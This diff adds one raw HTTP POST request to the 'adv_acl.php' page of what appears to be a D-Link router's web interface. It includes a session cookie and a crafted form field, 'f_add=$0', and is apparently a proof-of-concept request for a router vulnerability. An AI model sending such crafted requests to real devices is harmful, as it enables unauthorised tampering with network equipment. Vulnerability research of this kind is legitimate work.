@@ -1,0 +1,15 @@
+POST /adv_acl.php HTTP/1.1
+Host: 192.168.33.166:33549
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Origin: http://192.168.33.166:33549
+Connection: keep-alive
+Referer: http://192.168.33.166:33549/adv_acl.php
+Cookie: dlink_uid=gjbnzegntv
+Upgrade-Insecure-Requests: 1
+
+ACTION_POST=adv_acl&f_wlmode=&f_acl_del=&hacl_mac=&f_client_info_mac_add=&f_add=$0
